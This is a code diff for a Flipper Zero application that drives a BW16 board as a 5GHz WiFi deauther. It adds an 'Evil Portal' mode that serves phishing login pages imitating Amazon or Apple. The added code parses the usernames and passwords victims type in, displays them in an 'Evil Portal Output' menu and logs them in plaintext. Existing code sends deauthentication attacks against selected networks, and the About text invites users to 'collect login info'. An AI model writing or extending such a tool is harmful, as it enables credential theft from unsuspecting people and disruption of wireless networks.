@@ -31,6 +31,7 @@
 typedef enum {
     DeautherSubmenuIndexSetup,
     DeautherSubmenuIndexDeauth,
+    DeautherSubmenuIndexPortal, // Add Evil Portal index
     DeautherSubmenuIndexAbout,
 } DeautherSubmenuIndex;
 
@@ -54,6 +55,7 @@ typedef enum {
     DeautherViewSelect,
     DeautherViewAttack,
     DeautherViewNetwork, // Grouped network submenu
+    DeautherViewPortal,  // Add Evil Portal submenu view
 } DeautherView;
 
 
@@ -82,6 +84,7 @@ typedef struct {
     Widget* widget_attack;
 
     Submenu* submenu_network; // Grouped network submenu;
+    Submenu* submenu_portal;  // Evil Portal submenu
 
     VariableItem* setting_2_item; // The name setting item (so we can update the text)
     char* temp_buffer; // Temporary buffer for text input
@@ -104,6 +107,9 @@ typedef struct {
     uint8_t* select_bands; // Dynamic array for band (0=2.4, 1=5)
     bool select_ready; // Set to true when <iX> is received and all <n...> are processed
     uint32_t scan_duration_ms; // Custom scan duration in ms
+
+    uint8_t portal_index; // Store selected portal index (1=Default, 2=Amazon, 3=Apple)
+    uint32_t portal_submenu_index; // Index for portal submenu items
 } DeautherApp;
 
 typedef struct {
@@ -205,6 +211,13 @@ static void deauther_submenu_callback(void* context, uint32_t index) {
         break;
     case DeautherSubmenuIndexDeauth:
         view_dispatcher_switch_to_view(app->view_dispatcher, DeautherViewDeauth);
+        break;
+    case DeautherSubmenuIndexPortal:
+        // Clear portal submenu and request current portal list
+        submenu_reset(app->submenu_portal);
+        app->portal_submenu_index = 0;
+        
+        view_dispatcher_switch_to_view(app->view_dispatcher, DeautherViewPortal);
         break;
     case DeautherSubmenuIndexAbout:
         view_dispatcher_switch_to_view(app->view_dispatcher, DeautherViewAbout);
@@ -418,17 +431,15 @@ static void deauth_submenu_callback(void* context, uint32_t index) {
             app->select_selected = NULL;
         }
         app->select_capacity = 0;
-        // Send a message via UART when scan is selected
+        // Send a message via UART when scan is selected using hex delimiters
         char uart_cmd[16];
         if(app->scan_duration_ms > 0) {
-            snprintf(uart_cmd, sizeof(uart_cmd), "<s%lu>", (unsigned long)app->scan_duration_ms);
+            snprintf(uart_cmd, sizeof(uart_cmd), "\x02s%lu\x03", (unsigned long)app->scan_duration_ms);
         } else {
-            snprintf(uart_cmd, sizeof(uart_cmd), "<s>");
+            snprintf(uart_cmd, sizeof(uart_cmd), "\x02s\x03");
         }
         size_t uart_cmd_len = strlen(uart_cmd);
         uart_helper_send(app->uart_helper, uart_cmd, uart_cmd_len);
-        // Switch to the scan view
-        //view_dispatcher_switch_to_view(app->view_dispatcher, DeautherViewScan);
         FURI_LOG_I(TAG, "scan");
         break;
     }
@@ -436,40 +447,36 @@ static void deauth_submenu_callback(void* context, uint32_t index) {
         // Clear previous entries in select submenu
         submenu_reset(app->submenu_select);
         app->select_index = 0;
-        // Send a message via UART when select is selected
-        const char* uart_cmd = "<g>";
-        size_t uart_cmd_len = strlen(uart_cmd);
-        uart_helper_send(app->uart_helper, uart_cmd, uart_cmd_len);
-        // Do not switch to view or build submenu yet; wait for all <n...> to arrive
+        // Send a message via UART when select is selected using hex delimiters
+        uart_helper_send(app->uart_helper, "\x02g\x03", 3);
+        // Do not switch to view or build submenu yet; wait for all networks to arrive
         app->select_ready = false;
-        // The submenu will be built and view switched in deauther_select_process_uart when all <n...> are received
         FURI_LOG_I(TAG, "select (waiting for networks)");
         break;
     }
     case DeautherSubmenuDeauthAttack: {
         if(!g_attack_active) {
             g_attack_active = true;
-            deauther_update_attack_label(app); // Show "Stop Attack" immediately
+            deauther_update_attack_label(app);
             // Start attack
             if(app->select_selected && app->select_labels) {
                 for(size_t i = 0; i < app->select_capacity; ++i) {
                     if(app->select_selected[i]) {
                         char uart_cmd[17];
-                        snprintf(uart_cmd, sizeof(uart_cmd), "<d%02zu-00>", i);
+                        snprintf(uart_cmd, sizeof(uart_cmd), "\x02d%02zu-00\x03", i);
                         uart_helper_send(app->uart_helper, uart_cmd, strlen(uart_cmd));
-                        furi_delay_ms(1000); // Add 1 second delay between each send
+                        furi_delay_ms(1000);
                     }
                 }
             }
             FURI_LOG_I(TAG, "attack started");
         } else if (g_attack_active) {
             // Stop attack
-            uart_helper_send(app->uart_helper, "<ds>", 4);
+            uart_helper_send(app->uart_helper, "\x02ds\x03", 4);
             g_attack_active = false;
             deauther_update_attack_label(app);
             FURI_LOG_I(TAG, "attack stopped");
         } else {
-            // If attack is not active, do nothing
             FURI_LOG_I(TAG, "attack already stopped");
         }
         break;
@@ -557,48 +564,114 @@ static void deauther_build_select_submenu(DeautherApp* app) {
 static void deauther_select_process_uart(FuriString* line, void* context) {
     DeautherApp* app = (DeautherApp*)context;
     const char* str = furi_string_get_cstr(line);
-    if(str[0] == '<' && str[2] == '>' && str[1] == 'i') {
-        int num = atoi(str + 2);
-        submenu_reset(app->submenu_select);
-        app->select_index = 0;
-        // Free previous arrays
-        if(app->select_labels) {
-            for(size_t i = 0; i < app->select_capacity; ++i) free(app->select_labels[i]);
-            free(app->select_labels);
-            app->select_labels = NULL;
-        }
-        if(app->select_selected) {
-            free(app->select_selected);
-            app->select_selected = NULL;
-        }
-        if(app->select_macs) {
-            for(size_t i = 0; i < app->select_capacity; ++i) free(app->select_macs[i]);
-            free(app->select_macs);
-            app->select_macs = NULL;
-        }
-        if(app->select_bands) {
-            free(app->select_bands);
-            app->select_bands = NULL;
-        }
-        app->select_capacity = (num > 0) ? num : 0;
-        if(app->select_capacity > 0) {
-            app->select_labels = (char**)malloc(app->select_capacity * sizeof(char*));
-            app->select_selected = (uint8_t*)calloc(app->select_capacity, sizeof(uint8_t));
-            app->select_macs = (char**)malloc(app->select_capacity * sizeof(char*));
-            app->select_bands = (uint8_t*)calloc(app->select_capacity, sizeof(uint8_t));
-            for(size_t i = 0; i < app->select_capacity; ++i) {
-                app->select_labels[i] = (char*)calloc(MAX_LABEL_LEN, sizeof(char));
-                app->select_macs[i] = (char*)calloc(MAX_MAC_LEN, sizeof(char));
-                app->select_bands[i] = 0;
+    
+    // Debug: Log all received UART data
+    FURI_LOG_I(TAG, "UART received: '%s'", str);
+    
+    // Handle portal credentials: \x02c\x1DUSERNAME\x1DPASSWORD\x03
+    // Search for the pattern anywhere in the string, not just at the beginning
+    char* start_tag = strchr(str, '\x02');
+    if(start_tag && start_tag[1] == 'c') {
+        char* end_tag = strchr(start_tag, '\x03');
+        if(end_tag) {
+            FURI_LOG_I(TAG, "Portal credential line detected");
+            // Find the separators (hex 1D)
+            char* sep1 = strchr(start_tag + 2, '\x1D'); // First separator after 'c'
+            char* sep2 = sep1 ? strchr(sep1 + 1, '\x1D') : NULL; // Second separator
+            
+            if(sep1 && sep2 && sep2 < end_tag) {
+                // Extract username between first and second separator
+                size_t username_len = sep2 - (sep1 + 1);
+                char username[MAX_LABEL_LEN];
+                if(username_len > MAX_LABEL_LEN - 1) username_len = MAX_LABEL_LEN - 1;
+                memcpy(username, sep1 + 1, username_len);
+                username[username_len] = '\0';
+                
+                // Extract password between second separator and end
+                size_t password_len = end_tag - (sep2 + 1);
+                char password[MAX_LABEL_LEN];
+                if(password_len > MAX_LABEL_LEN - 1) password_len = MAX_LABEL_LEN - 1;
+                memcpy(password, sep2 + 1, password_len);
+                password[password_len] = '\0';
+                
+                // Create formatted labels
+                char username_label[MAX_LABEL_LEN];
+                char password_label[MAX_LABEL_LEN];
+                snprintf(username_label, sizeof(username_label), "User: %.*s", (int)(sizeof(username_label) - 7), username);
+                snprintf(password_label, sizeof(password_label), "Pass: %.*s", (int)(sizeof(password_label) - 7), password);
+                
+                // Add username item to portal submenu
+                submenu_add_item(
+                    app->submenu_portal,
+                    username_label,
+                    app->portal_submenu_index++,
+                    NULL, // No callback for username
+                    app);
+                
+                // Add password item to portal submenu
+                submenu_add_item(
+                    app->submenu_portal,
+                    password_label,
+                    app->portal_submenu_index++,
+                    NULL, // No callback for password
+                    app);
+                
+                FURI_LOG_I(TAG, "Added portal credentials - User: %s, Pass: %s", username, password);
+            } else {
+                FURI_LOG_W(TAG, "Portal credential format invalid - missing separators");
             }
+        } else {
+            FURI_LOG_W(TAG, "Portal credential format invalid - no end tag");
         }
-        // Mark as not ready, and reset received count
-        app->select_ready = false;
-        app->select_index = 0;
-    } else if(str[0] == '<' && str[1] == 'n') {
-        // Parse <n...> line
+        return;
+    }
+    
+    // Handle network count: \x02iX\x03
+    if(str[0] == '\x02' && str[1] == 'i' && strchr(str, '\x03')) {
+        char* end_tag = strchr(str, '\x03');
+        if(end_tag) {
+            int num = atoi(str + 2);
+            submenu_reset(app->submenu_select);
+            app->select_index = 0;
+            // Free previous arrays
+            if(app->select_labels) {
+                for(size_t i = 0; i < app->select_capacity; ++i) free(app->select_labels[i]);
+                free(app->select_labels);
+                app->select_labels = NULL;
+            }
+            if(app->select_selected) {
+                free(app->select_selected);
+                app->select_selected = NULL;
+            }
+            if(app->select_macs) {
+                for(size_t i = 0; i < app->select_capacity; ++i) free(app->select_macs[i]);
+                free(app->select_macs);
+                app->select_macs = NULL;
+            }
+            if(app->select_bands) {
+                free(app->select_bands);
+                app->select_bands = NULL;
+            }
+            app->select_capacity = (num > 0) ? num : 0;
+            if(app->select_capacity > 0) {
+                app->select_labels = (char**)malloc(app->select_capacity * sizeof(char*));
+                app->select_selected = (uint8_t*)calloc(app->select_capacity, sizeof(uint8_t));
+                app->select_macs = (char**)malloc(app->select_capacity * sizeof(char*));
+                app->select_bands = (uint8_t*)calloc(app->select_capacity, sizeof(uint8_t));
+                for(size_t i = 0; i < app->select_capacity; ++i) {
+                    app->select_labels[i] = (char*)calloc(MAX_LABEL_LEN, sizeof(char));
+                    app->select_macs[i] = (char*)calloc(MAX_MAC_LEN, sizeof(char));
+                    app->select_bands[i] = 0;
+                }
+            }
+            // Mark as not ready, and reset received count
+            app->select_ready = false;
+            app->select_index = 0;
+        }
+    } else if(str[0] == '\x02' && str[1] == 'n') {
+        // Parse network data: \x02nX\x1D....\x03
         char* sep1 = strchr(str, '\x1D');
-        char* end = strchr(str, '>');
+        char* end = strchr(str, '\x03');
         if(sep1 && end && sep1 < end) {
             int idx = atoi(str + 2);
             char* sep2 = strchr(sep1 + 1, '\x1D');
@@ -726,7 +799,7 @@ static void deauther_select_process_uart(FuriString* line, void* context) {
 */
 
 
-static const char* setting_1_config_label = "Wifi Status";
+static const char* setting_1_config_label = "Wifi Portal";
 static uint8_t setting_1_values[] = {0, 1};
 static char* setting_1_names[] = {"Off", "On"};
 static void deauther_setting_1_change(VariableItem* item) {
@@ -735,9 +808,15 @@ static void deauther_setting_1_change(VariableItem* item) {
     variable_item_set_current_value_text(item, setting_1_names[index]);
     // Only send UART message if value changes
     if(app->last_wifi_status != index) {
-        const char* uart_cmd = (index == 1) ? "<w1>" : "<w0>";
-        size_t uart_cmd_len = strlen(uart_cmd);
-        uart_helper_send(app->uart_helper, uart_cmd, uart_cmd_len);
+        if(index == 1) {
+            // On: send \x02wX\x03 where X is portal_index
+            char uart_cmd[8];
+            snprintf(uart_cmd, sizeof(uart_cmd), "\x02w%u\x03", app->portal_index);
+            uart_helper_send(app->uart_helper, uart_cmd, strlen(uart_cmd));
+        } else {
+            // Off: send \x02w0\x03
+            uart_helper_send(app->uart_helper, "\x02w0\x03", 4);
+        }
         app->last_wifi_status = index;
     }
 }
@@ -772,6 +851,17 @@ static void deauther_setting_scan_duration_change(VariableItem* item) {
 }
 
 
+// --- Portal Setup ---
+static const char* setting_portal_label = "Portal";
+static char* setting_portal_names[] = {"Default", "Amazon", "Apple"};
+#define PORTAL_COUNT 3
+static void deauther_setting_portal_change(VariableItem* item) {
+    DeautherApp* app = variable_item_get_context(item);
+    uint8_t index = variable_item_get_current_value_index(item);
+    variable_item_set_current_value_text(item, setting_portal_names[index]);
+    app->portal_index = index + 1; // 1=Default, 2=Amazon, 3=Apple
+}
+
 /**
  * @brief      Allocate the skeleton application.
  * @details    This function allocates the skeleton application resources.
@@ -788,13 +878,14 @@ static DeautherApp* deauther_app_alloc() {
 
     FURI_LOG_I(TAG, "init");
 
-
     //main screen
     app->submenu = submenu_alloc();
     submenu_add_item(
         app->submenu, "Setup", DeautherSubmenuIndexSetup, deauther_submenu_callback, app);
     submenu_add_item(
         app->submenu, "Deauth", DeautherSubmenuIndexDeauth, deauther_submenu_callback, app);
+    submenu_add_item(
+        app->submenu, "Evil Portal Output", DeautherSubmenuIndexPortal, deauther_submenu_callback, app); // Add Evil Portal
     submenu_add_item(
         app->submenu, "About", DeautherSubmenuIndexAbout, deauther_submenu_callback, app);
     view_set_previous_callback(submenu_get_view(app->submenu), deauther_navigation_exit_callback);
@@ -849,21 +940,15 @@ static DeautherApp* deauther_app_alloc() {
     view_dispatcher_add_view(
         app->view_dispatcher, DeautherViewNetwork, submenu_get_view(app->submenu_network));
 
-    // Attack screen
-    app->widget_attack = widget_alloc();
-    widget_add_text_scroll_element(
-        app->widget_attack,
-        0,
-        0,
-        128,
-        64,
-        "This is a sampl application.\n---\nReplace code and message\nwith your content!\n\nauthor: @codeallnight\nhttps://discord.com/invite/NsjCvqwPAd\nhttps://youtube.com/@MrDerekJamison");
+    // --- Evil Portal submenu ---
+    app->submenu_portal = submenu_alloc();
+    // Start with empty submenu - items will be added via UART
+    app->portal_submenu_index = 0;
     view_set_previous_callback(
-        widget_get_view(app->widget_attack), deauther_navigation_deauth_callback);
+        submenu_get_view(app->submenu_portal), deauther_navigation_submenu_callback);
     view_dispatcher_add_view(
-        app->view_dispatcher, DeautherViewAttack, widget_get_view(app->widget_attack));
-
-
+        app->view_dispatcher, DeautherViewPortal, submenu_get_view(app->submenu_portal));
+    // ...existing code...
 
 
     //Text input screen
@@ -874,7 +959,6 @@ static DeautherApp* deauther_app_alloc() {
     app->temp_buffer = (char*)malloc(app->temp_buffer_size);
 
     // Setup screen
-    
     app->wifi_server_status = variable_item_list_alloc();
     variable_item_list_reset(app->wifi_server_status);
     VariableItem* item = variable_item_list_add(
@@ -886,6 +970,17 @@ static DeautherApp* deauther_app_alloc() {
     uint8_t wifi_status_index = 0;
     variable_item_set_current_value_index(item, wifi_status_index);
     variable_item_set_current_value_text(item, setting_1_names[wifi_status_index]);
+    // Add Portal variable item
+    VariableItem* portal_item = variable_item_list_add(
+        app->wifi_server_status,
+        setting_portal_label,
+        PORTAL_COUNT,
+        deauther_setting_portal_change,
+        app);
+    variable_item_set_current_value_index(portal_item, 0); // Default to "Default"
+    variable_item_set_current_value_text(portal_item, setting_portal_names[0]);
+    app->portal_index = 1; // Default
+
     // Add hidden network toggle
     VariableItem* hidden_item = variable_item_list_add(
         app->wifi_server_status,
@@ -926,7 +1021,7 @@ static DeautherApp* deauther_app_alloc() {
         0,
         128,
         64,
-        "This is my 5GHz deauther app for the BW16.\nThe (5) means that its a 5Ghz network\n---\nIt is still a work in progress.\n\n");
+        "This is my 5GHz deauther app for the BW16.\nThe (5) means that its a 5Ghz network\nTo use Evil Portal, choose a portal in the Setup menu, turn on Wifi Portal and go to the Evil Portal Output menu to collect login info!\n\n");
     view_set_previous_callback(
         widget_get_view(app->widget_about), deauther_navigation_submenu_callback);
     view_dispatcher_add_view(
@@ -945,11 +1040,12 @@ static DeautherApp* deauther_app_alloc() {
 
     app->last_wifi_status = 0; // Default to Off
     app->select_index = 0; // Initialize select submenu index
+    app->portal_submenu_index = 0; // Initialize portal submenu index
     // UART buffer for select screen
     app->uart_buffer = (char*)malloc(UART_BUFFER_SIZE);
     app->uart_buffer_len = 0;
     // Set up UART line processing for select screen
-    uart_helper_set_delimiter(app->uart_helper, '>', true); // Use '>' as delimiter, include it
+    uart_helper_set_delimiter(app->uart_helper, '\x03', true); // Use hex 03 as delimiter, include it
     uart_helper_set_callback(app->uart_helper, deauther_select_process_uart, app);
 
     return app;
@@ -962,42 +1058,66 @@ static DeautherApp* deauther_app_alloc() {
 */
 static void deauther_app_free(DeautherApp* app) {
 #ifdef BACKLIGHT_ON
-    notification_message(app->notifications, &sequence_display_backlight_enforce_auto);
+    if(app->notifications) notification_message(app->notifications, &sequence_display_backlight_enforce_auto);
 #endif
-    furi_record_close(RECORD_NOTIFICATION);
+    if(app->notifications) furi_record_close(RECORD_NOTIFICATION);
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewTextInput);
-    text_input_free(app->text_input);
-    free(app->temp_buffer);
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewAbout);
-    widget_free(app->widget_about);
+    if(app->view_dispatcher && app->text_input) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewTextInput);
+        text_input_free(app->text_input);
+    }
+    if(app->temp_buffer) free(app->temp_buffer);
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewScan);
-    widget_free(app->widget_scan);
+    if(app->view_dispatcher && app->widget_about) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewAbout);
+        widget_free(app->widget_about);
+    }
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSelect);
-    submenu_free(app->submenu_select);
+    if(app->view_dispatcher && app->widget_scan) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewScan);
+        widget_free(app->widget_scan);
+    }
 
-    // Clear the network submenu
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewNetwork);
-    submenu_free(app->submenu_network);
+    if(app->view_dispatcher && app->submenu_select) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSelect);
+        submenu_free(app->submenu_select);
+    }
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewAttack);
-    widget_free(app->widget_attack);
+    if(app->view_dispatcher && app->submenu_network) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewNetwork);
+        submenu_free(app->submenu_network);
+    }
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewDeauth);
-    submenu_free(app->deauth_submenu);
+    if(app->view_dispatcher && app->submenu_portal) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewPortal);
+        submenu_free(app->submenu_portal);
+    }
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSetup);
-    variable_item_list_free(app->wifi_server_status);
+    if(app->view_dispatcher && app->widget_attack) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewAttack);
+        widget_free(app->widget_attack);
+    }
 
-    view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSubmenu);
-    submenu_free(app->submenu);
-    view_dispatcher_free(app->view_dispatcher);
+    if(app->view_dispatcher && app->deauth_submenu) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewDeauth);
+        submenu_free(app->deauth_submenu);
+    }
+
+    if(app->view_dispatcher && app->wifi_server_status) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSetup);
+        variable_item_list_free(app->wifi_server_status);
+    }
+
+    if(app->view_dispatcher && app->submenu) {
+        view_dispatcher_remove_view(app->view_dispatcher, DeautherViewSubmenu);
+        submenu_free(app->submenu);
+    }
+
+    if(app->view_dispatcher) view_dispatcher_free(app->view_dispatcher);
     furi_record_close(RECORD_GUI);
 
-    uart_helper_free(app->uart_helper);
-    furi_string_free(app->uart_message);
+    if(app->uart_helper) uart_helper_free(app->uart_helper);
+    if(app->uart_message) furi_string_free(app->uart_message);
     if(app->uart_buffer) {
         free(app->uart_buffer);
         app->uart_buffer = NULL;
